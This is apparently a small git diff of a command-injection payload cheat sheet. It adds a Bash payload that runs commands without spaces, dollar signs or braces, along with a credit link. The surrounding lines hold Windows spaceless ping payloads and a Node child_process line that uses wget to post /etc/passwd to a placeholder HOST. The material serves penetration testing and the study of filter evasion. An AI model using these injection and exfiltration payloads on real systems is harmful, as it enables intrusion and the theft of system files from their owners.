@@ -50,6 +50,12 @@ ping%CommonProgramFiles:~10,-18%IP
 ping%PROGRAMFILES:~10,-5%IP
 ```
 
+
+Code execution without spaces, $ or { } - Linux (Bash only)
+```
+IFS=,;`cat<<<uname,-a`
+```
+
 ## Time based data exfiltration
 Extracting data : char by char
 ```
@@ -82,3 +88,4 @@ require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ## Thanks to
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
 * [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
+* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
